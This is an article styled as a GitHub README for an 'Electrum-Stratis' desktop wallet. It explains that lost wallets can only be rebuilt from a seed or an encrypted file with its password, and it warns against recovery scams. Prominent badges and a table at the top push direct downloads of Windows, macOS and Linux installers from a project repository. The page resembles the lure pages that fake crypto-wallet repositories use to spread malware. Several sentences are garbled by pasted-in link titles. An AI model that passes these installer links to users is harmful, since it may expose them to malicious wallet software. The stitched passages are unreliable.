![Electrum-Stratis](assets/banner-article.png)

# What wallet recovery can and cannot do

<p align="center">What no tool can do</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Recovery works when you still hold one of two objects: the seed, or the encrypted wallet file. With the seed, the wallet comes back completely; with the file and its password, it opens as it was. Without either, nothing restores it - not software, not a service, not the project. Lost coins stay lost because the chain has no administrator and no reversal. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain.

## You'll see this if

<div align="center">

| What you still have | What recovery can do | What it cannot |
|---|---|---|
| Seed | Rebuild the wallet anywhere | Restore coins from another seed |
| File plus password | Open the wallet as it was | Survive a forgotten password |
| File, password forgotten | Test candidate passwords | Reveal the password |
| Nothing | Nothing | Anything |

</div>

The honest framing is narrow: recovery is the reconstruction of a wallet from material you still possess. It is not the retrieval of material you have lost.

## Why it happens

A wallet is a key holder, and the chain records ownership by key. If the key material survives, the coins are yours and any copy of the software can prove it. If it does not, the coins remain on the chain, visible to everyone, spendable by no one. With no seed, no wallet file and no device holding the keys, there is nothing to reconstruct from, and no amount of guessing changes that.

That is a property of the design rather than a defect. The same absence of an administrator that stops a bank from freezing your balance stops anyone from restoring it after the key is gone. "Are lost bitcoins gone forever?" has one answer: yes, when the keys are gone and no copy exists.

Two objects can do the work - a seed and a wallet file. The wallet is actively maintained, and the build it ships, on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19), is designed around exactly those two rather than implying a third.

## Fix

1. **Establish what you hold.** A seed, a file with a password, a raw key, or nothing. Each answer leads somewhere different, and guessing wastes the one resource that matters: time before a compromised seed is emptied.
2. **Restore from the seed if it exists.** Choose Recover, enter the phrase in the wallet window, compare the address preview with a known address, then commit and sync.
3. **Open the file if you have its password.** Import or open it directly; the wallet shows the balance once it reaches the current height.
4. **Search candidates if the password is gone.** The offline search tests guesses against the file, reports odds and stops when it cannot succeed. It is a search, not a decryption.
5. **Accept the endpoint when neither object exists.** Write down what you know - addresses, transaction IDs, dates - because a future record may reconnect the coins to a backup you had forgotten, and because a police report needs it.

No step in this sequence requires anyone else. That is the test for any offer you receive: if it needs your seed sent somewhere, it is not recovery.

## If that did not work

If a seed restores a wallet with the wrong addresses, the phrase belongs to a different wallet or a different chain. Compare the address format before concluding the seed is bad.

If a file opens but the balance is short, the missing part is usually an imported key or an unconfirmed transaction rather than a failed recovery.

If a person or a service claims to have recovered funds for others, ask what they would need from you. The answer, in every fraudulent case, is the file, the seed or a fee. A short balance after a restore is usually an [standard, multisig and imported wallets in Electrum Stratis](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/standard-multisig-imported-wallets.md) rather than a failed recovery, and a balance that never appears at all is often a [three causes of a missing Electrum Stratis balance](https://github.com/electrum-stratis-project/electrum-stratis-fixes/blob/main/balance-is-missing.md) rather than a lost wallet.

## Prevention

- Write the seed at creation and verify it once by restoring.
- Keep a file copy with its password recorded elsewhere.
- Label backups with the wallet and chain they belong to.
- Test the restore yearly, before you need it.
- Treat any promise of fund recovery as fraud until proven otherwise.
- Decide what you would do if a key were gone, and keep a copy somewhere other than the machine.

## FAQ

### Can you recover lost crypto wallets?

Only from material you still hold: the seed, or the file with its password. A wallet with neither is not recoverable by anyone, and a service claiming otherwise is selling a search you can run yourself.

### Can I recover my wallet if I do not have the recovery phrase?

Yes, if you have the encrypted file and its password - that opens the wallet without the phrase. If the password is also gone, the file can only be tested against candidates, and if the file is gone too, there is nothing left to recover from.

### How do I recover my wallet?

Restore from the seed through the Recover flow, or open the wallet file with its password. Both are local operations inside the application; neither requires a third party, a fee or an internet connection beyond syncing afterwards.

### Are lost bitcoins gone forever?

When the keys are gone and no backup exists, yes. The coins remain visible on the chain and cannot be moved by anyone. That is why the seed, written down and tested, is the only real insurance a self-custody wallet offers.

<!-- DOWNLOAD-BLOCK -->

A restore cannot recover what was never derived from the seed, cannot reopen a closed conversion service, and cannot undo a transaction the chain accepted. It rebuilds keys, scans for their history and shows what the chain holds. Anything outside that boundary, from a Qt key to a support promise, needs a different answer, and no amount of retrying changes it.

## Related articles

- [Is the seed enough to restore the wallet?](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/is-the-seed-enough-to-restore.md)
- [Three backup models: seed, wallet file and password](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/seed-file-and-password-backups.md)
- [Crypto recovery scams](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/paid-services-that-promise-funds-back.md)
- [Electrum Stratis password recovery: what is possible](https://github.com/electrum-stratis-project/electrum-stratis-recovery/blob/main/password-cannot-be-recovered.md)
